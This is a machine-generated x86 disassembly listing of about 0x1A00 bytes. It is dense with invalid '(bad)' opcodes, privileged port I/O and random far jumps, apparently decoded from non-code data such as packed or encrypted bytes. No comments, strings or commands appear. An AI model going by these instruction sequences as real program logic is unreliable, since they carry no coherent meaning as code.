  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	test   al,0xd8
  416d82:	jle    0x416d0a
  416d84:	pop    eax
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	rol    BYTE PTR [esp+eax*4],1
  416d8f:	inc    esp
  416d90:	mov    esp,0xf62976c4
  416d95:	mov    ecx,0xbd9eee38
  416d9a:	rol    cl,cl
  416d9c:	lock xor ebp,ecx
  416d9f:	pusha  
  416da0:	hlt    
  416da1:	jae    0x416db9
  416da3:	dec    ecx
  416da4:	(bad)  
  416da5:	mov    bl,0x2f
  416da7:	jb     0x416d60
  416da9:	inc    edx
  416daa:	lahf   
  416dab:	adc    eax,0x662feb9a
  416db0:	das    
  416db1:	xchg   DWORD PTR [edi-0x6cc619ae],edx
  416db7:	fstp   TBYTE PTR [esi-0x70]
  416dba:	out    dx,al
  416dbb:	std    
  416dbc:	fs adc bl,ch
  416dbf:	fisttp DWORD PTR [esi+0x44]
  416dc2:	sbb    ebp,DWORD PTR ds:0x2ae333a6
  416dc8:	stos   BYTE PTR es:[edi],al
  416dc9:	in     eax,dx
  416dca:	inc    ebp
  416dcb:	clc    
  416dcc:	fistp  DWORD PTR [esi]
  416dce:	in     al,0xde
  416dd0:	test   eax,0x909f4108
  416dd5:	push   eax
  416dd6:	xor    eax,0x1be1d871
  416ddb:	sub    esi,ebp
  416ddd:	clc    
  416dde:	fmul   st(2),st
  416de0:	pop    eax
  416de1:	sbb    al,0x55
  416de3:	dec    esp
  416de4:	cmp    al,0x5c
  416de6:	les    ebx,FWORD PTR [edx-0x4b]
  416de9:	call   0xdae6:0xaa53d760
  416df0:	jbe    0x416e49
  416df2:	fisubr DWORD PTR [ecx-0xff1ae5d]
  416df8:	or     BYTE PTR [ecx+esi*1-0x7c049070],dh
  416dff:	fbstp  TBYTE PTR [edi+0x60]
  416e02:	idiv   BYTE PTR [edi+0x4c]
  416e05:	ss je  0x416dd2
  416e08:	scas   eax,DWORD PTR es:[edi]
  416e09:	xor    ebp,DWORD PTR [eax-0x709f5dab]
  416e0f:	(bad)  
  416e10:	dec    esi
  416e11:	addr16 pop edx
  416e13:	mov    ebx,0xe19d201b
  416e18:	dec    esi
  416e19:	das    
  416e1a:	mov    DWORD PTR [edx],ecx
  416e1c:	fnstenv [edi+0x68]
  416e1f:	std    
  416e20:	push   edx
  416e21:	xchg   ebp,eax
  416e22:	test   al,0x97
  416e24:	dec    ebx
  416e25:	fstp   DWORD PTR [eiz*2+0x3ce30e6e]
  416e2c:	adc    al,0x41
  416e2e:	out    dx,eax
  416e2f:	aam    0x6b
  416e31:	js     0x416de0
  416e33:	pop    ds
  416e34:	test   al,0x40
  416e36:	inc    edx
  416e37:	mov    fs,edx
  416e39:	xlat   BYTE PTR ds:[ebx]
  416e3a:	cmc    
  416e3b:	(bad)  
  416e3c:	or     bl,ch
  416e3e:	sbb    DWORD PTR [ecx-0x10],esp
  416e41:	std    
  416e42:	pop    esi
  416e43:	jbe    0x416e43
  416e45:	sub    esi,0xffffff94
  416e48:	adc    al,0xe0
  416e4a:	in     eax,dx
  416e4b:	or     bl,dl
  416e4d:	loope  0x416e23
  416e4f:	out    dx,eax
  416e50:	shl    ah,0x75
  416e53:	not    DWORD PTR [edi+0x44471bf7]
  416e59:	fld    QWORD PTR [ecx]
  416e5b:	xchg   ebp,eax
  416e5c:	push   ss
  416e5d:	mov    ebp,0xd42a5181
  416e62:	iret   
  416e63:	retf   
  416e64:	test   al,0x89
  416e66:	adc    DWORD PTR [edx-0x92a2f41],0x6f
  416e6d:	inc    edx
  416e6e:	pushf  
  416e6f:	scas   al,BYTE PTR es:[edi]
  416e70:	cmp    eax,0x7191e494
  416e75:	mov    cs,WORD PTR [ebp+0x3d]
  416e78:	stos   DWORD PTR es:[edi],eax
  416e79:	mov    ch,0xf6
  416e7b:	dec    edx
  416e7c:	and    ah,BYTE PTR [ebp-0x4596a868]
  416e82:	lods   eax,DWORD PTR ds:[esi]
  416e83:	fdiv   DWORD PTR [edi+0x2a]
  416e86:	ins    BYTE PTR es:[edi],dx
  416e87:	in     al,dx
  416e88:	add    edi,esp
  416e8a:	les    esi,FWORD PTR [ecx+0x28]
  416e8d:	fist   WORD PTR [ecx]
  416e8f:	rol    BYTE PTR [eax],1
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xe1308eea
  416f02:	adc    eax,0xf25cef
  416f07:	add    BYTE PTR [ecx+eax*1],al
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	dec    ebx
  416f0d:	in     eax,0x82
  416f0f:	test   BYTE PTR [ecx],bh
  416f11:	cmp    DWORD PTR [ebx+0x54],ebp
  416f14:	mov    cs,WORD PTR [edx-0x71742784]
  416f1a:	inc    eax
  416f1b:	jns    0x416f3e
  416f1d:	sbb    DWORD PTR [edx+0x2b],ebp
  416f20:	mov    WORD PTR [edi-0x287317bd],?
  416f26:	stos   BYTE PTR es:[edi],al
  416f27:	fcmove st,st(3)
  416f29:	adc    ecx,DWORD PTR [ebx]
  416f2b:	xchg   esi,eax
  416f2c:	iret   
  416f2d:	sub    ecx,DWORD PTR [ebx-0x2d17f63e]
  416f33:	or     al,0x7a
  416f35:	and    al,0x24
  416f37:	and    DWORD PTR [ebx+0xaab12bc],esi
  416f3d:	inc    eax
  416f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f3f:	pop    edx
  416f40:	fdivrp st(6),st
  416f42:	cld    
  416f43:	sahf   
  416f44:	sub    bh,bh
  416f46:	neg    DWORD PTR [ebx-0x29]
  416f49:	fs fwait
  416f4b:	(bad)  
  416f4c:	xchg   esi,eax
  416f4d:	jg     0x416f7a
  416f4f:	or     BYTE PTR [ebp-0x760b6ea3],cl
  416f55:	cwde   
  416f56:	jb     0x416fb7
  416f58:	xchg   ebp,eax
  416f59:	sub    eax,DWORD PTR [edi]
  416f5b:	outs   dx,BYTE PTR ds:[esi]
  416f5c:	leave  
  416f5d:	mov    bh,0x67
  416f5f:	or     al,BYTE PTR [ebp+0x241afaea]
  416f65:	mov    esp,0x253c26d1
  416f6a:	jo     0x416f76
  416f6c:	xchg   BYTE PTR [ecx-0x2a],dl
  416f6f:	ror    BYTE PTR [ebp-0x69a379a8],cl
  416f75:	pop    ds
  416f76:	xchg   edi,eax
  416f77:	cmp    al,ah
  416f79:	xor    al,0xa2
  416f7b:	loope  0x416f83
  416f7d:	or     BYTE PTR [ecx],ch
  416f7f:	adc    edi,DWORD PTR [eax+0x41fc29c8]
  416f85:	repz imul esi,DWORD PTR [ebp+ecx*8-0x53],0xeb865796
  416f8e:	mov    BYTE PTR [edi],cl
  416f90:	push   0xffffffc7
  416f92:	rcl    dl,cl
  416f94:	div    DWORD PTR [ebx]
  416f96:	push   0xfffffff9
  416f98:	jg     0x416f3b
  416f9a:	popa   
  416f9b:	lea    esi,[esi+0x57a65692]
  416fa1:	fmul   QWORD PTR [edx-0x456b1554]
  416fa7:	js     0x416fa8
  416fa9:	popf   
  416faa:	retf   0x637d
  416fad:	loope  0x416f5b
  416faf:	sahf   
  416fb0:	sbb    al,0x60
  416fb2:	lods   eax,DWORD PTR ds:[esi]
  416fb3:	push   esp
  416fb4:	dec    edx
  416fb5:	push   ecx
  416fb6:	sub    BYTE PTR [edx+0x112f416e],0xf8
  416fbd:	jne    0x416fa2
  416fbf:	popf   
  416fc0:	(bad)  
  416fc1:	hlt    
  416fc2:	inc    edx
  416fc3:	xchg   ebp,eax
  416fc4:	inc    ebx
  416fc5:	adc    al,0xaa
  416fc7:	inc    esp
  416fc8:	(bad)  
  416fc9:	xor    BYTE PTR [edi],al
  416fcb:	les    eax,FWORD PTR [edx+0x67367718]
  416fd1:	fisub  DWORD PTR [ecx+0x57a056c0]
  416fd7:	fnstenv [ecx]
  416fd9:	scas   eax,DWORD PTR es:[edi]
  416fda:	loope  0x416f82
  416fdc:	mov    ds:0x576e21cb,al
  416fe1:	mov    dh,0xf8
  416fe3:	stc    
  416fe4:	pop    edx
  416fe5:	outs   dx,DWORD PTR ds:[esi]
  416fe6:	or     eax,0x4c2989a5
  416feb:	cwde   
  416fec:	sahf   
  416fed:	int3   
  416fee:	sahf   
  416fef:	loop   0x416f92
  416ff1:	stos   BYTE PTR es:[edi],al
  416ff2:	add    DWORD PTR [esi+0x562124bb],esi
  416ff8:	and    BYTE PTR [ecx-0x5689266d],dl
  416ffe:	in     eax,0x30
  417000:	xor    DWORD PTR [esi+ecx*8],ebp
  417003:	sahf   
  417004:	add    BYTE PTR [edx],0x39
  417007:	push   esi
  417008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417009:	xchg   bh,bl
  41700b:	cdq    
  41700c:	mov    dl,0x3e
  41700e:	dec    edx
  41700f:	aas    
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ebp,DWORD PTR [esi]
  417081:	inc    edi
  417082:	retf   
  417083:	ja     0x4170e5
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	sbb    eax,0x6238e0d6
  417091:	push   ds
  417092:	adc    DWORD PTR [edi],eax
  417094:	adc    BYTE PTR [edx-0x463b2118],bl
  41709a:	push   ebp
  41709b:	(bad)  
  41709c:	or     ah,dl
  41709e:	dec    edi
  41709f:	cmp    BYTE PTR [ebx+0x49bcedd6],cl
  4170a5:	push   ebp
  4170a6:	ins    DWORD PTR es:[edi],dx
  4170a7:	(bad)  
  4170a8:	pop    esp
  4170a9:	sahf   
  4170aa:	push   ecx
  4170ab:	ret    0x3597
  4170ae:	or     dh,bl
  4170b0:	and    esi,esp
  4170b2:	iret   
  4170b3:	retf   0xb029
  4170b6:	mov    ah,BYTE PTR [eax+0x57]
  4170b9:	lods   al,BYTE PTR ds:[esi]
  4170ba:	jmp    0xbd26:0x3deb3c24
  4170c1:	lods   al,BYTE PTR ds:[esi]
  4170c2:	mov    esi,0x63b2f168
  4170c7:	cmc    
  4170c8:	mov    gs,esi
  4170ca:	add    eax,0xecb8d2de
  4170cf:	mov    ebp,0xb80ae009
  4170d4:	lods   eax,DWORD PTR ds:[esi]
  4170d5:	loopne 0x417059
  4170d7:	xchg   edi,eax
  4170d8:	push   edi
  4170d9:	mov    dh,0xb7
  4170db:	(bad)  
  4170dd:	inc    ebx
  4170de:	jae    0x4170c2
  4170e0:	and    eax,edx
  4170e2:	cwde   
  4170e3:	inc    edx
  4170e4:	push   esi
  4170e5:	adc    BYTE PTR [edi],0xf1
  4170e8:	rcr    DWORD PTR [eax+0x23258271],1
  4170ee:	fst    DWORD PTR [esi+eax*4]
  4170f1:	jp     0x4170ec
  4170f3:	push   es
  4170f4:	arpl   WORD PTR [esi],si
  4170f6:	lods   al,BYTE PTR ds:[esi]
  4170f7:	or     BYTE PTR [edx-0x32529f7c],0x9c
  4170fe:	test   DWORD PTR [ebx],eax
  417100:	shl    dl,1
  417102:	jo     0x417095
  417104:	idiv   bh
  417106:	sar    DWORD PTR [edi-0x5de9cab8],cl
  41710c:	sub    eax,0x9c0349c0
  417111:	push   0xe7e4c2e4
  417116:	fild   QWORD PTR [ebp-0x7d]
  417119:	xor    DWORD PTR [eax-0x305b5197],ebp
  41711f:	pop    esp
  417120:	sub    edi,edi
  417122:	xchg   ebp,eax
  417123:	addr16 cmp esp,eax
  417126:	popf   
  417127:	je     0x417166
  417129:	mov    ah,0x24
  41712b:	push   edx
  41712c:	jne    0x417115
  41712e:	dec    esp
  41712f:	push   es
  417130:	dec    edi
  417131:	pop    esp
  417132:	pop    es
  417133:	mul    BYTE PTR ss:[ecx-0x57fd86ad]
  41713a:	call   FWORD PTR ds:[ecx+0x7bd1e282]
  417141:	clc    
  417142:	jge    0x417193
  417144:	fs ds es ret 
  417148:	dec    ebx
  417149:	call   0xec30f282
  41714e:	out    0x15,eax
  417150:	sub    DWORD PTR [esi],0xffffffe1
  417153:	cmp    dh,bl
  417155:	cmp    eax,0x8f032f57
  41715a:	fsubr  DWORD PTR [ebx+0x439735bb]
  417160:	cmp    BYTE PTR [edx-0x73],dl
  417163:	mov    ch,0x92
  417165:	adc    DWORD PTR [ebx+eiz*4+0xd005e25],edx
  41716c:	or     BYTE PTR [edi],al
  41716e:	pop    esi
  41716f:	bswap  edx
  417171:	mul    dl
  417173:	in     al,dx
  417174:	xor    eax,0xe539901
  417179:	mov    ds:0xb333d928,al
  41717e:	or     al,0x89
  417180:	mov    ?,WORD PTR [ecx+edx*1]
  417183:	(bad)  
  417184:	xchg   ebx,eax
  417185:	mov    ch,0x7e
  417187:	jmp    0x2062bafb
  41718c:	les    ecx,FWORD PTR ds:0x6468
	...
  4171f2:	add    BYTE PTR [eax],al
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	pusha  
  417201:	or     ebx,ecx
  417203:	lahf   
  417204:	fs hlt 
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	lock and eax,0x4945ffb9
  417212:	push   eax
  417213:	shl    DWORD PTR ds:0xd78e3bc1,0x50
  41721a:	(bad)  
  41721b:	push   ecx
  41721c:	ret    
  41721d:	mov    edi,edi
  41721f:	bound  ebx,QWORD PTR [ebx+0x2e52420]
  417225:	xlat   BYTE PTR ds:[ebx]
  417226:	in     eax,dx
  417227:	jbe    0x417280
  417229:	xor    edx,eax
  41722b:	rcl    BYTE PTR [esi+0x39aedbf8],cl
  417231:	adc    BYTE PTR [edx-0x450c2a37],bl
  417237:	std    
  417238:	cmp    DWORD PTR [esi-0x47],ecx
  41723b:	push   eax
  41723c:	jmp    0x16d2:0x261b22a5
  417243:	jle    0x417234
  417245:	jecxz  0x417295
  417247:	sub    al,0x59
  417249:	fdiv   DWORD PTR [edi]
  41724b:	or     BYTE PTR [ebp-0x3e2d7e88],al
  417251:	xor    al,BYTE PTR [eax+0x55]
  417254:	arpl   WORD PTR ds:[ecx],di
  417257:	loop   0x4172a4
  417259:	and    DWORD PTR [si+0x23],ebp
  41725d:	mov    ds:0xae78aa8d,al
  417262:	inc    edx
  417263:	mov    dl,0x61
  417265:	dec    ebp
  417266:	popa   
  417267:	pop    eax
  417268:	xchg   ecx,eax
  417269:	popf   
  41726a:	loope  0x4171fc
  41726c:	pop    edi
  41726d:	jge    0x41729d
  41726f:	div    DWORD PTR [ecx-0x43b4df5]
  417275:	stos   BYTE PTR es:[edi],al
  417276:	sbb    eax,ebp
  417278:	in     eax,0xab
  41727a:	dec    eax
  41727b:	scas   al,BYTE PTR es:[edi]
  41727c:	mov    ecx,0xdca35bb3
  417281:	sub    edx,DWORD PTR [eax]
  417283:	adc    BYTE PTR fs:[edi],cl
  417286:	(bad)  
  417287:	in     eax,dx
  417288:	jmp    0x2c8b:0x148e47a2
  41728f:	pop    esp
  417290:	iret   
  417291:	into   
  417292:	push   0x260e1fb1
  417297:	(bad)  
  417298:	cmp    al,0xe
  41729a:	rcr    DWORD PTR [eax],cl
  41729c:	rcr    DWORD PTR [eax+0x73c32751],1
  4172a2:	call   0x83f2:0x2c14addc
  4172a9:	imul   ecx,DWORD PTR ds:0x961f05fe,0x1a
  4172b0:	pop    ss
  4172b1:	test   DWORD PTR [eax+0x21],0x450d4c6d
  4172b8:	dec    eax
  4172b9:	int3   
  4172ba:	pop    ecx
  4172bb:	stos   DWORD PTR es:[edi],eax
  4172bc:	xor    BYTE PTR [edi+0x1fe2eec1],bl
  4172c2:	enter  0x8af6,0x19
  4172c6:	imul   esp,edx,0x5641c646
  4172cc:	in     al,0x70
  4172ce:	fnstcw WORD PTR [ebx-0x4e528fb3]
  4172d4:	push   0x48
  4172d6:	xchg   esp,eax
  4172d7:	dec    BYTE PTR [ebp-0x78]
  4172da:	imul   esp,ecx,0xbf13ce39
  4172e0:	test   WORD PTR [edi],dx
  4172e3:	test   eax,0x2fba07b5
  4172e8:	pop    eax
  4172e9:	xor    eax,0xbf9d16c9
  4172ee:	mov    ah,0x52
  4172f0:	xchg   esi,eax
  4172f1:	(bad)  
  4172f2:	cmc    
  4172f3:	das    
  4172f4:	(bad)  
  4172f5:	leave  
  4172f6:	and    BYTE PTR [ebx-0x3fe6825f],ch
  4172fc:	popf   
  4172fd:	and    edx,esp
  4172ff:	arpl   dx,bp
  417301:	jle    0x41734e
  417303:	jp     0x417380
  417305:	psllq  mm7,mm0
  417308:	add    BYTE PTR [eax+ecx*2-0x44402a01],bl
  41730f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs jnp 0x417398
  417382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417383:	mov    WORD PTR [eax-0xb],gs
  417386:	add    BYTE PTR [eax],al
  417388:	add    al,0x1
  41738a:	add    BYTE PTR [eax],al
  41738c:	lods   al,BYTE PTR ds:[esi]
  41738d:	pop    ds
  41738e:	xchg   edx,eax
  41738f:	adc    esp,DWORD PTR [ecx-0x1b391dca]
  417395:	mov    eax,ds:0x63aca390
  41739a:	jmp    0x4173f5
  41739c:	call   0x6ad0:0xac8f0935
  4173a3:	inc    ecx
  4173a4:	retf   0x652b
  4173a7:	icebp  
  4173a8:	test   DWORD PTR [edx],ebx
  4173aa:	add    dl,BYTE PTR [ebp+0x6591c744]
  4173b0:	push   es
  4173b1:	jmp    0x5532f05f
  4173b6:	add    BYTE PTR [edi+ebp*2-0x4f],0xe9
  4173bb:	mov    esi,0xa74ae4ec
  4173c0:	into   
  4173c1:	sub    dh,dh
  4173c3:	and    esp,edi
  4173c5:	jno    0x41742e
  4173c7:	cld    
  4173c8:	cli    
  4173c9:	vmptrst QWORD PTR [ebp+0x20b9e7b4]
  4173d0:	mov    ebx,0x1cec7694
  4173d5:	in     al,dx
  4173d6:	cmp    edi,ebx
  4173d8:	stos   BYTE PTR es:[edi],al
  4173d9:	lods   eax,DWORD PTR ds:[esi]
  4173da:	push   es
  4173db:	dec    ebx
  4173dc:	push   0xffffffea
  4173de:	adc    eax,0x6e99f36
  4173e3:	cmp    DWORD PTR ds:[edi],0xf2bb527a
  4173ea:	inc    edi
  4173eb:	stc    
  4173ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173ed:	in     eax,0x45
  4173ef:	test   DWORD PTR [esi+0x7c],ebx
  4173f2:	adc    DWORD PTR [ebp+0x20bd9fdf],0xa29e1300
  4173fc:	(bad)  
  4173fd:	xor    BYTE PTR [edi-0x44d113ae],bl
  417403:	mov    ebx,0x34d6bcde
  417408:	loope  0x41747d
  41740a:	mov    al,0x7a
  41740c:	xchg   BYTE PTR [esi+0x5a],cl
  41740f:	xor    dh,BYTE PTR cs:[ebx-0x5c]
  417413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417414:	adc    bl,bl
  417416:	cwde   
  417417:	mov    esi,0x6d5de296
  41741c:	mov    edi,0x4d3482e
  417421:	adc    ebp,DWORD PTR [ecx+0x2282cbac]
  417427:	dec    BYTE PTR [ebp+esi*2-0x49]
  41742b:	ror    bh,1
  41742d:	cmp    DWORD PTR [edx-0x23],ebx
  417430:	mov    esi,0x2674b23c
  417435:	and    eax,0x8b4fb393
  41743a:	clc    
  41743b:	pop    edx
  41743c:	xlat   BYTE PTR ds:[ebx]
  41743d:	inc    edx
  41743e:	mov    ds:0x8e036c3a,eax
  417443:	xchg   edx,eax
  417444:	in     al,0xf3
  417446:	sbb    eax,0x7530abf2
  41744b:	or     al,0x1a
  41744d:	dec    ebx
  41744e:	out    0x60,eax
  417450:	retf   0x724e
  417453:	add    eax,0xfda64577
  417458:	xlat   BYTE PTR ds:[ebx]
  417459:	cmc    
  41745a:	(bad)  
  41745b:	clc    
  41745c:	imul   eax,esp,0x34108a4
  417462:	xchg   edi,eax
  417463:	into   
  417464:	imul   esi,DWORD PTR ds:0x5f02c518,0xd780cdf1
  41746e:	pop    edi
  41746f:	push   edx
  417470:	dec    ebx
  417471:	shl    edx,0x5c
  417474:	or     eax,0xfc9c807c
  417479:	push   edx
  41747a:	cmp    BYTE PTR [eax+eax*8+0xb],dl
  41747e:	in     al,dx
  41747f:	mov    cl,BYTE PTR [ebx-0x7a]
  417482:	outs   dx,DWORD PTR ds:[esi]
  417483:	in     al,0x54
  417485:	mov    eax,0x48ce8fbc
  41748a:	sbb    ebx,DWORD PTR [ebp-0x52]
  41748d:	repnz push edi
  41748f:	cld    
	...
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	test   al,0xc0
  417502:	in     al,0x30
  417504:	ins    BYTE PTR es:[edi],dx
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	outs   dx,DWORD PTR ds:[esi]
  41750d:	loopne 0x41751b
  41750f:	in     al,0xc0
  417511:	mov    bl,BYTE PTR [edx]
  417513:	pop    ebp
  417514:	or     BYTE PTR [edi],dl
  417516:	test   al,0x6d
  417518:	icebp  
  417519:	bound  esp,QWORD PTR [ecx-0x111ecb1a]
  41751f:	(bad)  
  417520:	cmp    esp,edi
  417522:	jnp    0x4174d8
  417524:	popa   
  417525:	adc    BYTE PTR [edx-0x7d],0x8a
  417529:	add    ebx,DWORD PTR [esi+0x21]
  41752c:	dec    edx
  41752d:	imul   ebp,DWORD PTR [edi],0xffffff88
  417530:	xor    esi,DWORD PTR [eax]
  417532:	outs   dx,DWORD PTR ds:[esi]
  417533:	sub    al,0x44
  417535:	es inc edi
  417537:	repnz leave 
  417539:	jp     0x417518
  41753b:	push   ss
  41753c:	mov    esi,0x111ee196
  417541:	dec    edx
  417542:	push   esi
  417543:	popa   
  417544:	inc    ebx
  417545:	add    DWORD PTR [edi+0x38],0x4476eb52
  41754c:	test   DWORD PTR [ecx+ebp*2-0x7f6e90eb],esi
  417553:	push   ecx
  417554:	pop    edx
  417555:	popf   
  417556:	push   0x57d1f88f
  41755b:	push   0x19
  41755d:	push   cs
  41755e:	shl    BYTE PTR [ebp+0x2b],cl
  417561:	test   eax,0x46135bb8
  417566:	mov    ds:0xa5ef6744,eax
  41756b:	dec    edx
  41756c:	call   0xe5e268e
  417571:	xlat   BYTE PTR ds:[bx]
  417573:	add    edi,edi
  417575:	mov    eax,0x95b53238
  41757a:	div    BYTE PTR [ebx-0x7d]
  41757d:	int    0xe
  41757f:	jo     0x417600
  417581:	fiadd  WORD PTR [eax+ecx*8-0x5b]
  417585:	mov    dh,0x69
  417587:	sbb    BYTE PTR [ecx],0x39
  41758a:	dec    ebp
  41758b:	fcom   DWORD PTR [esp+esi*1-0x70]
  41758f:	sub    edx,ebx
  417591:	jmp    0x2e07:0x860b4420
  417598:	out    dx,al
  417599:	and    edx,esi
  41759b:	pop    ecx
  41759c:	mov    fs,WORD PTR [ebx+0x761635e4]
  4175a2:	and    cl,cl
  4175a4:	jb     0x41759c
  4175a6:	push   ebp
  4175a7:	out    dx,eax
  4175a8:	popa   
  4175a9:	in     al,dx
  4175aa:	xor    eax,0xf43f2895
  4175af:	outs   dx,DWORD PTR ds:[esi]
  4175b0:	in     al,0x8a
  4175b2:	add    BYTE PTR es:[ecx-0x59],dl
  4175b6:	leave  
  4175b7:	cmp    esp,edx
  4175b9:	ins    BYTE PTR es:[edi],dx
  4175ba:	imul   esp,DWORD PTR gs:[edi-0xcebae06],0x4c
  4175c2:	shl    ecx,1
  4175c4:	xlat   BYTE PTR ds:[ebx]
  4175c5:	adc    edi,DWORD PTR gs:[esi+0x1f]
  4175c9:	fsub   DWORD PTR [esi]
  4175cb:	and    BYTE PTR [edx-0x50a1a7f4],bh
  4175d1:	and    eax,0x83b9f6c1
  4175d6:	rcpps  xmm3,XMMWORD PTR [eax+ebx*1-0x543397b7]
  4175de:	cld    
  4175df:	mov    eax,0xb256b52d
  4175e4:	pop    ebx
  4175e5:	push   ds
  4175e6:	sbb    ecx,DWORD PTR [edi-0xe]
  4175e9:	xchg   ebx,eax
  4175ea:	push   0xffffff82
  4175ec:	icebp  
  4175ed:	mov    DWORD PTR [ebx-0x6aae26c4],edx
  4175f3:	push   esi
  4175f4:	not    BYTE PTR [ebx-0x57]
  4175f7:	xor    ah,BYTE PTR [ebp+0x2258468c]
  4175fd:	nop
  4175fe:	lods   eax,DWORD PTR ds:[esi]
  4175ff:	cmp    BYTE PTR [edi],bl
  417601:	push   esp
  417602:	adc    esi,DWORD PTR [edx+0x4597c706]
  417608:	push   ecx
  417609:	mov    cl,0x1f
  41760b:	or     dh,BYTE PTR [esi+0x1338ca]
	...
  417671:	add    BYTE PTR [eax],al
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fimul  DWORD PTR [ecx]
  417681:	std    
  417682:	stos   BYTE PTR es:[edi],al
  417683:	xor    DWORD PTR [eax-0x9],0x1040000
  41768a:	add    BYTE PTR [eax],al
  41768c:	jp     0x4176c3
  41768e:	xchg   dx,ax
  417690:	repnz ins DWORD PTR es:[edi],dx
  417692:	int3   
  417693:	sub    al,0x57
  417695:	pusha  
  417696:	mov    ebx,esp
  417698:	xchg   edx,eax
  417699:	xchg   esi,eax
  41769a:	retf   0xcc41
  41769d:	pop    edi
  41769e:	push   ds
  41769f:	jle    0x41769d
  4176a1:	out    dx,eax
  4176a2:	pop    es
  4176a3:	into   
  4176a4:	push   eax
  4176a5:	pop    es
  4176a6:	retf   0xd4bc
  4176a9:	popa   
  4176aa:	push   ds
  4176ab:	or     eax,0x2a60a63e
  4176b0:	xchg   BYTE PTR [edx+0x5db202fb],al
  4176b6:	pop    ebp
  4176b7:	mov    cl,0x6
  4176b9:	pop    esi
  4176ba:	mov    dl,BYTE PTR [edi+0x5ed92e06]
  4176c0:	and    al,0xed
  4176c2:	mov    dl,0x11
  4176c4:	push   ds
  4176c5:	cli    
  4176c6:	cld    
  4176c7:	add    dh,BYTE PTR [ebx-0x34d397b3]
  4176cd:	es out dx,eax
  4176cf:	push   esp
  4176d0:	enter  0x6ad9,0x92
  4176d4:	fnstenv [eax+eax*1+0x70]
  4176d8:	ficomp WORD PTR [eax]
  4176da:	not    al
  4176dc:	mov    ds:0x62ba112e,al
  4176e1:	sub    edx,DWORD PTR [ecx+eiz*2+0x3d]
  4176e5:	ds dec ebx
  4176e7:	cwde   
  4176e8:	ficomp DWORD PTR gs:[ebp-0x74]
  4176ec:	shl    esp,cl
  4176ee:	aam    0xeb
  4176f0:	jmp    0xff657fce
  4176f5:	aam    0xc
  4176f7:	aad    0x36
  4176f9:	dec    ebx
  4176fa:	out    dx,eax
  4176fb:	clc    
  4176fc:	adc    ch,BYTE PTR [ebp+0x69]
  4176ff:	js     0x417746
  417701:	xchg   esi,eax
  417702:	push   esp
  417703:	mov    ecx,esp
  417705:	jne    0x417700
  417707:	stos   BYTE PTR es:[edi],al
  417708:	(bad)  
  417709:	sub    al,0x4b
  41770b:	dec    esi
  41770c:	inc    ebx
  41770d:	cmp    dh,ah
  41770f:	or     eax,0xd341754b
  417714:	pop    ds
  417715:	ret    
  417716:	sahf   
  417717:	stos   DWORD PTR es:[edi],eax
  417718:	retf   0x413f
  41771b:	push   edx
  41771c:	inc    esp
  41771d:	xor    esi,DWORD PTR [ecx-0x3b17f322]
  417723:	mov    ds:0xb907d56d,al
  417728:	cwde   
  417729:	push   ss
  41772a:	cmp    ebx,edx
  41772c:	push   es
  41772d:	test   al,0x53
  41772f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417730:	aaa    
  417731:	sub    ch,BYTE PTR [esi+0x54]
  417734:	shr    DWORD PTR [ebp-0xa],0xd8
  417738:	ins    BYTE PTR es:[edi],dx
  417739:	jbe    0x4177a3
  41773b:	or     al,0x22
  41773d:	fsubp  st(0),st
  41773f:	mov    ah,0xc1
  417741:	add    DWORD PTR [ecx],eax
  417743:	xchg   ebx,eax
  417744:	mov    eax,0xac4266e9
  417749:	std    
  41774a:	clc    
  41774b:	jge    0x4176fd
  41774d:	inc    ebx
  41774e:	sub    ah,BYTE PTR fs:[edx]
  417751:	push   ebp
  417752:	lds    ebx,FWORD PTR [ecx+0x3e91156e]
  417758:	(bad)  
  417759:	dec    ecx
  41775a:	fcomp  QWORD PTR [edi-0x53]
  41775d:	(bad)  
  41775e:	xor    eax,0xd896e0a6
  417763:	shl    BYTE PTR [ebx+eax*2+0x6a691a0d],cl
  41776a:	pushf  
  41776b:	data16 cmc 
  41776d:	jnp    0x41775e
  41776f:	aas    
  417770:	sub    cl,dl
  417772:	(bad)  
  417773:	in     al,dx
  417774:	adc    ecx,DWORD PTR [ebp-0x8]
  417777:	je     0x417731
  417779:	mov    bh,cl
  41777b:	lods   al,BYTE PTR ds:[esi]
  41777c:	dec    ecx
  41777d:	dec    edx
  41777e:	(bad)  
  41777f:	jb     0x4177ba
  417781:	or     al,0xa2
  417783:	les    ebx,FWORD PTR [eax-0x2e]
  417786:	jns    0x41774c
  417788:	(bad)  
  417789:	pause  
